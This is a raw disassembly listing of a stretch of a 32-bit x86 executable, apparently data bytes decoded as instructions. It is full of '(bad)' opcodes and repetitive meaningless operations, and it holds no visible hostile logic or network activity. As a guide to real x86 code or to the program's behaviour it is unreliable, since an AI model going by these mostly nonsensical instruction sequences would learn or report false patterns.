  40b19d:	add    DWORD PTR [ecx],eax
  40b19f:	add    DWORD PTR [ecx],eax
  40b1a1:	add    DWORD PTR [ecx],eax
  40b1a3:	add    DWORD PTR [ecx],eax
  40b1a5:	add    DWORD PTR [ecx],eax
  40b1a7:	add    DWORD PTR [ecx],eax
  40b1a9:	icebp  
  40b1aa:	pop    ecx
  40b1ab:	pop    ecx
  40b1ac:	pop    ecx
  40b1ad:	pop    ecx
  40b1ae:	lods   al,BYTE PTR ds:[esi]
  40b1af:	test   eax,0x9493929f
  40b1b4:	xchg   esp,eax
  40b1b5:	lea    ecx,[ebp-0x7c7c7c73]
  40b1bb:	jge    0x40b23a
  40b1bd:	jge    0x40b238
  40b1bf:	jns    0x40b23a
  40b1c1:	je     0x40b22c
  40b1c3:	cmp    eax,0x4a0d4642
  40b1c8:	dec    ebp
  40b1c9:	push   edx
  40b1ca:	push   ebx
  40b1cb:	pop    es
  40b1cc:	inc    BYTE PTR [ecx]
  40b1ce:	add    DWORD PTR [ecx],eax
  40b1d0:	add    DWORD PTR [ecx],eax
  40b1d2:	add    DWORD PTR [ecx],eax
  40b1d4:	add    DWORD PTR [ecx],eax
  40b1d6:	add    DWORD PTR [ecx],eax
  40b1d8:	add    eax,esi
  40b1da:	pop    eax
  40b1db:	fwait
  40b1dc:	mov    al,ds:0x929fa9b4
  40b1e1:	xchg   ebx,eax
  40b1e2:	xchg   esp,eax
  40b1e3:	xchg   esp,eax
  40b1e4:	lea    ecx,[ebp-0x7c7c7c73]
  40b1ea:	jge    0x40b269
  40b1ec:	jge    0x40b267
  40b1ee:	jns    0x40b269
  40b1f0:	je     0x40b266
  40b1f2:	xchg   BYTE PTR [esi+eax*2+0xd],al
  40b1f6:	dec    edx
  40b1f7:	dec    ebp
  40b1f8:	push   edx
  40b1f9:	push   ebx
  40b1fa:	fucomip st,st(5)
  40b1fc:	push   ebp
  40b1fd:	clc    
  40b1fe:	add    DWORD PTR [ecx],eax
  40b200:	add    DWORD PTR [ecx],eax
  40b202:	add    DWORD PTR [ecx],eax
  40b204:	add    DWORD PTR [ecx],eax
  40b206:	add    DWORD PTR [ecx],eax
  40b208:	lock lock repnz mov dl,0xa5
  40b20d:	test   eax,0x9493929f
  40b212:	xchg   esp,eax
  40b213:	lea    ecx,[ebp-0x7c7c7c73]
  40b219:	jge    0x40b298
  40b21b:	jge    0x40b296
  40b21d:	jns    0x40b298
  40b21f:	je     0x40b295
  40b221:	jo     0x40b21b
  40b223:	jne    0x40b232
  40b225:	dec    edx
  40b226:	dec    ebp
  40b227:	push   edx
  40b228:	push   esp
  40b229:	(bad)  
  40b22b:	loope  0x40b225
  40b22d:	inc    BYTE PTR [ecx]
  40b22f:	add    DWORD PTR [ecx],eax
  40b231:	add    DWORD PTR [ecx],eax
  40b233:	add    DWORD PTR [ecx],eax
  40b235:	add    DWORD PTR [ecx],eax
  40b237:	add    eax,esi
  40b239:	lock hlt 
  40b23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23c:	test   eax,0x9493929f
  40b241:	xchg   esp,eax
  40b242:	lea    ecx,[ebp-0x7c7c7c73]
  40b248:	jge    0x40b2c7
  40b24a:	jge    0x40b2c5
  40b24c:	jns    0x40b2c7
  40b24e:	je     0x40b2c4
  40b250:	jo     0x40b296
  40b252:	sti    
  40b253:	out    dx,al
  40b254:	dec    edi
  40b255:	dec    ebp
  40b256:	push   edx
  40b257:	push   esp
  40b258:	(bad)  
  40b25a:	(bad)  
  40b25c:	repnz sti 
  40b25e:	cli    
  40b25f:	add    DWORD PTR [ecx],eax
  40b261:	add    DWORD PTR [ecx],eax
  40b263:	add    DWORD PTR [ecx],eax
  40b265:	add    DWORD PTR [ecx],eax
  40b267:	add    DWORD PTR [ecx],eax
  40b269:	add    eax,esi
  40b26b:	lock repnz hlt 
  40b26e:	jb     0x40b1f6
  40b270:	xchg   BYTE PTR [esi-0x7a7a7472],cl
  40b276:	cmp    DWORD PTR [ebp+0x7d],0x7d
  40b27a:	jns    0x40b2f5
  40b27c:	jns    0x40b2f2
  40b27e:	je     0x40b2f0
  40b280:	jo     0x40b2c9
  40b282:	push   edi
  40b283:	add    esp,esi
  40b285:	push   edx
  40b286:	push   esp
  40b287:	(bad)  
  40b289:	in     eax,0x5a
  40b28b:	lock xacquire add DWORD PTR [ecx],eax
  40b28f:	add    DWORD PTR [ecx],eax
  40b291:	add    DWORD PTR [ecx],eax
  40b293:	add    DWORD PTR [ecx],eax
  40b295:	add    DWORD PTR [ecx],eax
  40b297:	add    DWORD PTR [ecx],eax
  40b299:	add    DWORD PTR [ecx],eax
  40b29b:	add    DWORD PTR [ecx],eax
  40b29d:	add    DWORD PTR [ecx],eax
  40b29f:	lock lock lock lock lock lock lock lock lock xchg DWORD PTR [ebp+esi*2+0x75],ebp
  40b2ac:	outs   dx,BYTE PTR ds:[esi]
  40b2ad:	outs   dx,BYTE PTR ds:[esi]
  40b2ae:	imul   ebp,DWORD PTR [ecx+0x44],0x101f875
  40b2b5:	lock out dx,al
  40b2b7:	out    dx,al
  40b2b8:	out    dx,al
  40b2b9:	out    dx,al
  40b2ba:	add    DWORD PTR [ecx],eax
  40b2bc:	add    DWORD PTR [ecx],eax
  40b2be:	add    DWORD PTR [ecx],eax
  40b2c0:	add    DWORD PTR [ecx],eax
  40b2c2:	add    DWORD PTR [ecx],eax
  40b2c4:	add    DWORD PTR [ecx],eax
  40b2c6:	add    DWORD PTR [ecx],eax
  40b2c8:	add    DWORD PTR [ecx],eax
  40b2ca:	add    DWORD PTR [ecx],eax
  40b2cc:	add    DWORD PTR [ecx],eax
  40b2ce:	add    DWORD PTR [ecx],eax
  40b2d0:	add    DWORD PTR [ecx],eax
  40b2d2:	add    DWORD PTR [ecx],eax
  40b2d4:	add    DWORD PTR [ecx],eax
  40b2d6:	add    DWORD PTR [ecx],eax
  40b2d8:	lock lock lock lock lock lock lock lock lock lock add DWORD PTR [ecx],eax
  40b2e4:	add    DWORD PTR [ecx],eax
  40b2e6:	add    DWORD PTR [ecx],eax
  40b2e8:	add    DWORD PTR [ecx],eax
  40b2ea:	add    DWORD PTR [ecx],eax
  40b2ec:	add    DWORD PTR [ecx],eax
  40b2ee:	add    DWORD PTR [ecx],eax
  40b2f0:	add    DWORD PTR [ecx],eax
  40b2f2:	add    DWORD PTR [ecx],eax
  40b2f4:	add    DWORD PTR [ecx],eax
  40b2f6:	add    DWORD PTR [ecx],eax
  40b2f8:	dec    DWORD PTR [edi-0x1]
  40b2fe:	add    BYTE PTR [eax],al
  40b300:	inc    BYTE PTR [eax]
  40b302:	jg     0x40b2fc
  40b304:	ud0    eax,DWORD PTR [eax]
  40b307:	add    ah,bh
  40b309:	add    BYTE PTR [edi],al
  40b30b:	loopne 0x40b310
  40b30d:	inc    DWORD PTR [eax]
  40b30f:	add    al,bh
  40b311:	add    BYTE PTR [eax],al
  40b313:	add    BYTE PTR [eax],0xff
  40b316:	add    BYTE PTR [eax],al
  40b318:	lock add BYTE PTR [eax],al
  40b31b:	add    BYTE PTR [eax],al
  40b31d:	jg     0x40b31f
  40b31f:	add    al,ah
  40b321:	add    BYTE PTR [eax],al
  40b323:	add    BYTE PTR [eax],al
  40b325:	aas    
  40b326:	add    BYTE PTR [eax],al
  40b328:	loopne 0x40b32a
  40b32a:	add    BYTE PTR [eax],al
  40b32c:	add    BYTE PTR [edi],bl
  40b32e:	add    BYTE PTR [eax],al
  40b330:	loopne 0x40b332
  40b332:	add    BYTE PTR [eax],al
  40b334:	add    BYTE PTR [edi],cl
  40b336:	add    BYTE PTR [eax],al
  40b338:	loopne 0x40b33a
  40b33a:	add    BYTE PTR [eax],al
  40b33c:	add    BYTE PTR [edi],al
  40b33e:	add    BYTE PTR [eax],al
  40b340:	loopne 0x40b342
  40b342:	add    BYTE PTR [eax],al
  40b344:	add    BYTE PTR [edi],al
  40b346:	add    BYTE PTR [eax],al
  40b348:	loopne 0x40b34a
  40b34a:	add    BYTE PTR [eax],al
  40b34c:	add    BYTE PTR [ebx],al
  40b34e:	add    BYTE PTR [eax],al
  40b350:	loopne 0x40b352
  40b352:	add    BYTE PTR [eax],al
  40b354:	add    BYTE PTR [ebx],al
  40b356:	add    BYTE PTR [eax],al
  40b358:	loopne 0x40b35a
  40b35a:	add    BYTE PTR [eax],al
  40b35c:	add    BYTE PTR [ecx],al
  40b35e:	add    BYTE PTR [eax],al
  40b360:	loopne 0x40b362
  40b362:	add    BYTE PTR [eax],al
  40b364:	add    BYTE PTR [ecx],al
  40b366:	add    BYTE PTR [eax],al
  40b368:	loopne 0x40b36a
  40b36a:	add    BYTE PTR [eax],al
  40b36c:	add    BYTE PTR [ecx],al
  40b36e:	add    BYTE PTR [eax],al
  40b370:	loopne 0x40b372
  40b372:	add    BYTE PTR [eax],al
  40b374:	add    BYTE PTR [eax],al
  40b376:	add    BYTE PTR [eax],al
  40b378:	loopne 0x40b37a
  40b37a:	add    BYTE PTR [eax],al
  40b37c:	add    BYTE PTR [eax],al
  40b37e:	add    BYTE PTR [eax],al
  40b380:	loopne 0x40b382
  40b382:	add    BYTE PTR [eax],al
  40b384:	add    BYTE PTR [eax],al
  40b386:	add    BYTE PTR [eax],al
  40b388:	loopne 0x40b38a
  40b38a:	add    BYTE PTR [eax],al
  40b38c:	add    BYTE PTR [eax],al
  40b38e:	add    BYTE PTR [eax],al
  40b390:	loopne 0x40b392
  40b392:	add    BYTE PTR [eax],al
  40b394:	add    BYTE PTR [eax],al
  40b396:	add    BYTE PTR [eax],al
  40b398:	loopne 0x40b39a
  40b39a:	add    BYTE PTR [eax],al
  40b39c:	add    BYTE PTR [ecx],al
  40b39e:	add    BYTE PTR [eax],al
  40b3a0:	loopne 0x40b3a2
  40b3a2:	add    BYTE PTR [eax],al
  40b3a4:	add    BYTE PTR [ecx],al
  40b3a6:	add    BYTE PTR [eax],al
  40b3a8:	loopne 0x40b3aa
  40b3aa:	add    BYTE PTR [eax],al
  40b3ac:	add    BYTE PTR [ecx],al
  40b3ae:	add    BYTE PTR [eax],al
  40b3b0:	loopne 0x40b3b2
  40b3b2:	add    BYTE PTR [eax],al
  40b3b4:	add    BYTE PTR [ebx],al
  40b3b6:	add    BYTE PTR [eax],al
  40b3b8:	loopne 0x40b3ba
  40b3ba:	add    BYTE PTR [eax],al
  40b3bc:	add    BYTE PTR [ebx],al
  40b3be:	add    BYTE PTR [eax],al
  40b3c0:	loopne 0x40b3c2
  40b3c2:	add    BYTE PTR [eax],al
  40b3c4:	add    BYTE PTR [edi],al
  40b3c6:	add    BYTE PTR [eax],al
  40b3c8:	loopne 0x40b3ca
  40b3ca:	add    BYTE PTR [eax],al
  40b3cc:	add    BYTE PTR [edi],al
  40b3ce:	add    BYTE PTR [eax],al
  40b3d0:	loopne 0x40b3d2
  40b3d2:	add    BYTE PTR [eax],al
  40b3d4:	add    BYTE PTR [edi],cl
  40b3d6:	add    BYTE PTR [eax],al
  40b3d8:	loopne 0x40b3da
  40b3da:	add    BYTE PTR [eax],al
  40b3dc:	add    BYTE PTR [edi],bl
  40b3de:	add    BYTE PTR [eax],al
  40b3e0:	loopne 0x40b3e2
  40b3e2:	add    BYTE PTR [eax],al
  40b3e4:	add    BYTE PTR [edi],bh
  40b3e6:	add    BYTE PTR [eax],al
  40b3e8:	loopne 0x40b3ea
  40b3ea:	add    BYTE PTR [eax],al
  40b3ec:	add    BYTE PTR [edi+0x0],bh
  40b3ef:	add    al,ah
  40b3f1:	add    BYTE PTR [eax],al
  40b3f3:	add    BYTE PTR [ecx],al
  40b3f5:	inc    DWORD PTR [eax]
  40b3f7:	add    al,ah
  40b3f9:	add    BYTE PTR [eax],al
  40b3fb:	add    BYTE PTR [edi],cl
  40b3fd:	inc    DWORD PTR [eax]
  40b3ff:	add    al,ah
  40b401:	add    BYTE PTR [eax],al
  40b403:	add    BYTE PTR [ebx],al
  40b405:	inc    DWORD PTR [eax]
  40b407:	add    al,ah
  40b409:	add    BYTE PTR [eax],al
  40b40b:	add    BYTE PTR [eax],al
  40b40d:	inc    DWORD PTR [eax]
  40b40f:	add    al,ah
  40b411:	add    BYTE PTR [eax],al
  40b413:	add    BYTE PTR [ecx],al
  40b415:	inc    DWORD PTR [eax]
  40b417:	add    al,ah
  40b419:	add    BYTE PTR [eax],al
  40b41b:	add    BYTE PTR [ebx],al
  40b41d:	inc    DWORD PTR [eax]
  40b41f:	add    al,ah
  40b421:	add    BYTE PTR [eax],al
  40b423:	add    BYTE PTR [edi],al
  40b425:	inc    DWORD PTR [eax]
  40b427:	add    al,al
  40b429:	add    BYTE PTR [eax],al
  40b42b:	add    BYTE PTR [edi],cl
  40b42d:	inc    DWORD PTR [eax]
  40b42f:	add    al,al
  40b431:	add    BYTE PTR [eax],al
  40b433:	add    BYTE PTR [edi],cl
  40b435:	inc    DWORD PTR [eax]
  40b437:	add    BYTE PTR [eax+0x7000000],al
  40b43d:	inc    DWORD PTR [eax]
  40b43f:	add    BYTE PTR [eax+0x7000000],al
  40b445:	inc    DWORD PTR [eax]
  40b447:	add    BYTE PTR [eax+0x3000000],al
  40b44d:	inc    DWORD PTR [eax]
  40b44f:	add    BYTE PTR [eax],al
  40b451:	add    BYTE PTR [eax],al
  40b453:	add    BYTE PTR [ebx],al
  40b455:	inc    DWORD PTR [eax]
  40b457:	add    BYTE PTR [eax],al
  40b459:	add    BYTE PTR [eax],al
  40b45b:	add    BYTE PTR [ecx],al
  40b45d:	inc    DWORD PTR [eax]
  40b45f:	add    al,al
  40b461:	add    BYTE PTR [eax],al
  40b463:	adc    BYTE PTR [edi],al
  40b465:	inc    DWORD PTR [eax]
  40b467:	add    dh,bh
  40b469:	add    BYTE PTR [eax],al
  40b46b:	sbb    BYTE PTR [edi],bh
  40b46d:	inc    DWORD PTR [eax]
  40b46f:	add    bh,bh
  40b471:	inc    DWORD PTR [eax]
  40b473:	aas    
  40b474:	(bad)  
  40b475:	inc    DWORD PTR [eax]
  40b477:	add    BYTE PTR [eax],ch
  40b479:	add    BYTE PTR [eax],al
  40b47b:	add    BYTE PTR [eax],ah
  40b47d:	add    BYTE PTR [eax],al
  40b47f:	add    BYTE PTR [eax+0x0],al
  40b482:	add    BYTE PTR [eax],al
  40b484:	add    DWORD PTR [eax],eax
  40b486:	or     BYTE PTR [eax],al
	...
  40b4a0:	jbe    0x40b508
  40b4a2:	mov    BYTE PTR [eax],al
  40b4a4:	add    BYTE PTR [eax],al
  40b4a6:	add    BYTE PTR [eax],al
  40b4a8:	(bad)  
  40b4a9:	clc    
  40b4aa:	inc    DWORD PTR [eax]
  40b4ac:	(bad)  
  40b4ad:	cld    
  40b4ae:	inc    DWORD PTR [eax]
  40b4b0:	mov    cl,0xb0
  40b4b2:	mov    cl,0x0
  40b4b4:	(bad)  
  40b4b5:	out    0xfd,al
  40b4b7:	add    bh,bh
  40b4b9:	hlt    
  40b4ba:	inc    BYTE PTR [eax]
  40b4bc:	dec    ebp
  40b4be:	icebp  
  40b4bf:	add    BYTE PTR [ebp-0x9ff7183],bl
  40b4c5:	mov    ch,0xce
  40b4c7:	add    ch,bh
  40b4c9:	(bad)  
  40b4ca:	fld    DWORD PTR [eax]
  40b4cc:	fadd   st,st(3)
  40b4ce:	retf   
  40b4cf:	add    ch,dh
  40b4d1:	repnz repz add bl,dh
  40b4d5:	loopne 0x40b4bb
  40b4d7:	add    bh,bh
  40b4d9:	hlt    
  40b4da:	test   BYTE PTR [eax],0xec
  40b4dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4de:	mov    al,0x0
  40b4e0:	(bad)  
  40b4e1:	rcr    ecx,cl
  40b4e3:	add    BYTE PTR [eax-0x22ff6f74],bh
  40b4e9:	xchg   esp,eax
  40b4ea:	cwde   
  40b4eb:	add    bh,bh
  40b4ed:	retf   
  40b4ee:	into   
  40b4ef:	add    bh,bh
  40b4f1:	loope  0x40b4d6
  40b4f3:	add    BYTE PTR [edx-0xff5e60],bh
  40b4f9:	pushf  
  40b4fa:	popf   
  40b4fb:	add    bh,al
  40b4fd:	jl     0x40b57d
  40b4ff:	add    ah,bh
  40b501:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b502:	test   al,0x0
  40b504:	jmp    FWORD PTR [edx-0x7939ff55]
  40b50a:	xchg   DWORD PTR [eax],eax
  40b50c:	inc    edx
  40b50e:	ret    
  40b50f:	add    bl,al
  40b511:	xchg   esp,eax
  40b512:	xchg   ebp,eax
  40b513:	add    bh,bh
  40b515:	aam    0xd5
  40b517:	add    bh,bh
  40b519:	cdq    
  40b51a:	cdq    
  40b51b:	add    bh,bh
  40b51d:	sahf   
  40b51e:	popf   
  40b51f:	add    bh,bh
  40b521:	sahf   
  40b522:	sahf   
  40b523:	add    bh,bh
  40b525:	mov    eax,ds:0xa7ff00a1
  40b52a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b52b:	add    BYTE PTR [edi-0x1aff8586],dh
  40b531:	popf   
  40b532:	popf   
  40b533:	add    bh,bh
  40b535:	mov    cl,0xb0
  40b537:	add    bh,bh
  40b539:	mov    dl,0xb2
  40b53b:	add    ch,bh
  40b53d:	mov    dl,0xb2
  40b53f:	add    bh,bh
  40b541:	mov    dh,0xb5
  40b543:	add    BYTE PTR [eax-0x5aff8182],dh
  40b549:	ja     0x40b5c2
  40b54b:	add    BYTE PTR [edx+0x52],dh
  40b54e:	push   edx
  40b54f:	add    bh,bh
  40b551:	mov    edx,0xacee00b9
  40b556:	lods   al,BYTE PTR ds:[esi]
  40b557:	add    BYTE PTR [edi-0x5ff9192],dl
  40b55d:	mov    eax,0x85b600b7
  40b562:	test   DWORD PTR [eax],eax
  40b564:	(bad)  
  40b565:	mov    esi,0xc6ff00bd
  40b56a:	mov    BYTE PTR [eax],0xeb
  40b56d:	mov    dh,0xb6
  40b56f:	add    dh,dl
  40b571:	test   al,0xa8
  40b573:	add    BYTE PTR [esi+0x37],al
  40b576:	aaa    
  40b577:	add    cl,cl
  40b579:	mov    al,ds:0xccff00a0
  40b57e:	int3   
  40b57f:	add    bh,bh
  40b581:	rcl    al,1
  40b583:	add    bl,bh
  40b585:	int3   
  40b586:	int3   
  40b587:	add    BYTE PTR [eax+ebp*2+0x68],bh
  40b58b:	add    bh,bh
  40b58d:	xlat   BYTE PTR ds:[ebx]
  40b58e:	xlat   BYTE PTR ds:[ebx]
  40b58f:	add    bh,bh
  40b591:	fcmovnu st,st(3)
  40b593:	add    bh,al
  40b595:	stos   DWORD PTR es:[edi],eax
  40b596:	stos   DWORD PTR es:[edi],eax
  40b597:	add    BYTE PTR [edx+ebx*4-0x2504ff66],dh
  40b59e:	fiadd  DWORD PTR [eax]
  40b5a0:	push   ecx
  40b5a1:	inc    edi
  40b5a2:	inc    edi
  40b5a3:	add    ch,cl
  40b5a5:	mov    ch,0xb5
  40b5a7:	add    BYTE PTR [edi+ebp*1],dh
  40b5aa:	das    
  40b5ab:	add    bh,bh
  40b5ad:	call   0xc81ab69a
  40b5b2:	mov    DWORD PTR [eax],0xdfdff2
  40b5b8:	sub    eax,0xff002a2a
  40b5bd:	out    dx,eax
  40b5be:	out    dx,eax
  40b5bf:	add    bl,bl
  40b5c1:	iret   
  40b5c2:	iret   
  40b5c3:	add    ah,ah
  40b5c5:	fcmovnu st,st(3)
  40b5c7:	add    al,ch
  40b5c9:	(bad)  
  40b5cb:	add    bl,dl
  40b5cd:	retf   
  40b5ce:	retf   
  40b5cf:	add    BYTE PTR [edi+0x73],dh
  40b5d2:	jae    0x40b5d4
  40b5d4:	(bad)  
  40b5d5:	stc    
  40b5d6:	stc    
  40b5d7:	add    al,dh
  40b5d9:	jmp    0xd9:0xd9df00ea
  40b5e0:	add    DWORD PTR [eax-0x2e2aff80],0xffffffd1
  40b5e7:	add    BYTE PTR [edx+0x68],ch
  40b5ea:	push   0xf8f8fb00
  40b5ef:	add    cl,dl
  40b5f1:	into   
  40b5f2:	into   
  40b5f3:	add    BYTE PTR [ebx+0x42],al
  40b5f6:	inc    edx
  40b5f7:	add    bh,bh
  40b5f9:	std    
  40b5fa:	std    
  40b5fb:	add    ch,bh
  40b5fd:	cld    
  40b5fe:	cld    
  40b5ff:	add    dh,bl
  40b601:	fstp   st(5)
  40b603:	add    dl,dl
  40b605:	rcl    ecx,1
  40b607:	add    dl,cl
  40b609:	xchg   esi,eax
  40b60a:	xchg   ebp,eax
  40b60b:	add    bh,bh
  40b60d:	(bad)
  40b611:	retf   
  40b612:	retf   0xf600
  40b615:	retf   0xc9
  40b618:	ror    BYTE PTR [edx-0x3b0cff7a],cl
  40b61e:	ret    0xf800
  40b621:	(bad)  
  40b622:	aam    0x0
  40b624:	icebp  
  40b625:	ror    dh,1
  40b627:	add    BYTE PTR [edx-0xff8e8a],dh
  40b62d:	into   
  40b62e:	leave  
  40b62f:	add    ch,dl
  40b631:	mov    edx,0x7cb100b7
  40b636:	jne    0x40b638
  40b638:	into   
  40b639:	pushf  
  40b63a:	xchg   ebp,eax
  40b63b:	add    ah,al
  40b63d:	pushf  
  40b63e:	xchg   esi,eax
  40b63f:	add    ch,bh
  40b641:	retf   
  40b642:	ret    0xf300
  40b645:	shl    DWORD PTR [edi-0x9080500],0x0
  40b64c:	mov    esi,0xf8008591
  40b651:	lds    esi,FWORD PTR [edi-0x453a1000]
  40b657:	add    ch,dl
  40b659:	mov    bh,0xaf
  40b65b:	add    bl,bl
  40b65d:	test   al,0x97
  40b65f:	add    bh,bh
  40b661:	int    0xbb
  40b663:	add    bl,ch
  40b665:	ret    0xb3
  40b668:	(bad)  
  40b669:	stc    
  40b66a:	test   DWORD PTR [eax],0x7b91c4
  40b670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b671:	mov    edi,DWORD PTR [edi+0x0]
  40b674:	mov    ebp,0xff006985
  40b679:	int    0xb4
  40b67b:	add    ch,dh
  40b67d:	out    dx,eax
  40b67e:	in     al,dx
  40b67f:	add    bl,ch
  40b681:	in     eax,0xe2
  40b683:	add    bl,dl
  40b685:	sahf   
  40b686:	add    BYTE PTR [eax],0xe1
  40b689:	shr    BYTE PTR [esi-0x1a161000],0x0
  40b690:	out    0xb6,al
  40b692:	xchg   ebp,eax
  40b693:	add    dl,ah
  40b695:	fcom   st(1)
  40b697:	add    bh,bh
  40b699:	into   
  40b69a:	stos   DWORD PTR es:[edi],eax
  40b69b:	add    ah,ch
  40b69d:	call   0x8b06b787
  40b6a2:	pop    edx
  40b6a3:	add    dh,dh
  40b6a5:	ret    
  40b6a6:	cwde   
  40b6a7:	add    bh,bh
  40b6a9:	int    0xa5
  40b6ab:	add    dl,dl
  40b6ad:	lds    edi,FWORD PTR [edx+0x3d80c800]
  40b6b3:	add    bh,bh
  40b6b5:	out    dx,eax
  40b6b6:	loopne 0x40b6b8
  40b6b8:	jmp    0x9acd:0xff00dde3
  40b6bf:	add    bh,bh
  40b6c1:	int    0x9d
  40b6c3:	add    bl,dh
  40b6c5:	leave  
  40b6c6:	lahf   
  40b6c7:	add    dl,dh
  40b6c9:	int3   
  40b6ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b6cb:	add    BYTE PTR [edi-0x34ffa08d],al
  40b6d1:	mov    bh,0xa3
  40b6d3:	add    cl,dh
  40b6d5:	loopne 0x40b6a6
  40b6d7:	add    cl,ch
  40b6d9:	(bad)  
  40b6db:	add    ch,ch
  40b6dd:	in     al,dx
  40b6de:	jmp    0x40b6e0
  40b6e0:	fnsave [ecx+0x0]
  40b6e3:	add    dh,bh
  40b6e5:	ret    0x7f
  40b6e8:	loopne 0x40b697
  40b6ea:	js     0x40b6ec
  40b6ec:	dec    ecx
  40b6ee:	mov    es,WORD PTR [eax]
  40b6f0:	dec    ah
  40b6f2:	xchg   esi,eax
  40b6f3:	add    bl,bl
  40b6f5:	(bad)  
  40b6f6:	mov    dl,0x0
  40b6f8:	jp     0x40b76b
  40b6fa:	addr16 add bl,bh
  40b6fd:	jmp    0x6a:0xbcfe00d7
  40b704:	loop   0x40b6ae
  40b706:	bound  eax,QWORD PTR [eax]
  40b708:	inc    eax
  40b70a:	jbe    0x40b70c
  40b70c:	inc    esp
  40b70e:	jnp    0x40b710
  40b710:	inc    edx
  40b712:	jnp    0x40b714
  40b714:	call   edx
  40b716:	sahf   
  40b717:	add    cl,bh
  40b719:	fidivr WORD PTR [ebp-0x37190100]
  40b71f:	add    bl,dh
  40b721:	xchg   DWORD PTR [eax],eax
  40b723:	add    bh,bh
  40b725:	mov    cl,0x48
  40b727:	add    ch,bh
  40b729:	mov    eax,0xbaff005a
  40b72e:	fs add cl,ch
  40b731:	mov    al,0x62
  40b733:	add    dh,dh
  40b735:	retf   0x93
  40b738:	not    esi
  40b73a:	lods   al,BYTE PTR ds:[esi]
  40b73b:	add    ah,bh
  40b73d:	fnsave [esi-0x13090200]
  40b743:	add    dh,bh
  40b745:	test   eax,0x9dec002a
  40b74a:	das    
  40b74b:	add    dh,bh
  40b74d:	scas   al,BYTE PTR es:[edi]
  40b74e:	ds add dh,ch
  40b751:	stos   DWORD PTR es:[edi],eax
  40b752:	dec    ecx
  40b753:	add    ah,dh
  40b755:	mov    ecx,0xbff40063
  40b75a:	jno    0x40b75c
  40b75c:	out    dx,al
  40b75d:	(bad)  
  40b75e:	mov    es,WORD PTR [eax]
  40b760:	in     eax,0xd1
  40b762:	mov    bl,0x0
  40b764:	mov    ebp,0xf200a7b4
  40b769:	mov    esi,0xcaf2006c
  40b76e:	lea    eax,[eax]
  40b770:	mov    dl,0xbb
  40b773:	add    cl,bl
  40b775:	les    ebx,FWORD PTR [ebx-0x45302600]
  40b77b:	add    bh,dl
  40b77d:	ror    ebx,cl
  40b77f:	add    ah,cl
  40b781:	retf   
  40b782:	enter  0x7b00,0x7b
  40b786:	push   ebp
  40b787:	add    bh,bh
  40b789:	(bad)  
  40b78a:	cli    
  40b78b:	add    bh,ah
  40b78d:	out    0xe6,eax
  40b78f:	add    cl,bl
  40b791:	loope  0x40b73f
  40b793:	add    cl,dl
  40b795:	fild   QWORD PTR [esi-0x4f213700]
  40b79b:	add    dh,cl
  40b79d:	loop   0x40b759
  40b79f:	add    BYTE PTR [ecx+0x7c],al
  40b7a2:	sub    al,0x0
  40b7a4:	mov    al,0xd9
  40b7a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7a7:	add    BYTE PTR [edi],ch
  40b7a9:	call   0x78:0xc780001d
  40b7b0:	cmp    al,0xac
  40b7b2:	xor    eax,0x4990600
  40b7b7:	add    BYTE PTR [edi],cl
  40b7b9:	scas   eax,DWORD PTR es:[edi]
  40b7ba:	sbb    eax,0x2db91b00
  40b7bf:	add    BYTE PTR [eax],ch
  40b7c1:	mov    DWORD PTR [ecx+0x0],0x55d535
  40b7c8:	dec    edx
  40b7c9:	call   0x8560b841
  40b7ce:	inc    edx
  40b7cf:	add    BYTE PTR [ecx-0x9],bl
  40b7d2:	xchg   ebx,eax
  40b7d3:	add    BYTE PTR [ebp-0x5dff5757],ah
  40b7d9:	int3   
  40b7da:	int3   
  40b7db:	add    ah,bh
  40b7dd:	(bad)  
  40b7de:	inc    DWORD PTR [eax]
  40b7e0:	jmp    0xdcdc:0xdb00ebeb
  40b7e7:	add    BYTE PTR [esi-0x36],al
  40b7ea:	rol    DWORD PTR [eax],1
  40b7ec:	in     al,0xe7
  40b7ee:	call   0xf130a4f3
  40b7f3:	add    dl,ch
  40b7f5:	in     al,dx
  40b7f6:	in     eax,dx
  40b7f7:	add    cl,ah
  40b7f9:	in     al,0xe6
  40b7fb:	add    BYTE PTR [edx-0x54],cl
  40b7fe:	stc    
  40b7ff:	add    BYTE PTR [eax+0x3100dcb6],cl
  40b805:	nop
  40b806:	repnz add bh,al
  40b809:	retf   0xcd
  40b80c:	mov    ebx,0xf800bfbd
  40b811:	cli    
  40b812:	cld    
  40b813:	add    ch,dh
  40b815:	idiv   ecx
  40b817:	add    cl,ah
  40b819:	jecxz  0x40b800
  40b81b:	add    dl,bl
  40b81d:	fcmovnu st,st(4)
  40b81f:	add    cl,bl
  40b821:	fcmovu st,st(3)
  40b823:	add    bh,dl
  40b825:	fcomp  st(1)
  40b827:	add    cl,ch
  40b829:	in     eax,dx
  40b82a:	repnz add dh,dh
  40b82d:	stc    
  40b82e:	std    
  40b82f:	add    bh,bl
  40b831:	loope  0x40b817
  40b833:	add    ah,dl
  40b835:	(bad)  
  40b836:	fld    DWORD PTR [eax]
  40b838:	(bad)  
  40b83a:	out    0x0,al
  40b83c:	out    dx,al
  40b83d:	repz cld 
  40b83f:	add    cl,cl
  40b841:	int3   
  40b842:	rol    DWORD PTR [eax],1
  40b844:	inc    esp
  40b845:	push   ebp
  40b846:	mov    ds:0xfefcfc00,eax
  40b84b:	add    cl,bl
  40b84d:	(bad)  
  40b84f:	add    bh,bh
  40b851:	(bad)  
  40b852:	inc    DWORD PTR [eax]
  40b854:	jmp    0xe241a242
  40b859:	loop   0x40b83d
  40b85b:	add    dl,bl
  40b85d:	fcmovu st,st(2)
  40b85f:	add    cl,bl
  40b861:	(bad)  
  40b863:	add    ah,dl
  40b865:	aam    0xd4
  40b867:	add    dl,dl
  40b869:	rcl    dl,cl
  40b86b:	add    al,dl
  40b86d:	rcl    al,1
  40b86f:	add    dh,cl
  40b871:	into   
  40b872:	into   
  40b873:	add    bl,cl
  40b875:	retf   
  40b876:	retf   
  40b877:	add    cl,al
  40b879:	rol    ecx,0x0
  40b87c:	mov    bh,0xb7
  40b87e:	mov    bh,0x0
  40b880:	nop
  40b881:	nop
  40b882:	nop
  40b883:	add    BYTE PTR [ebx+0x73],dh
  40b886:	jae    0x40b888
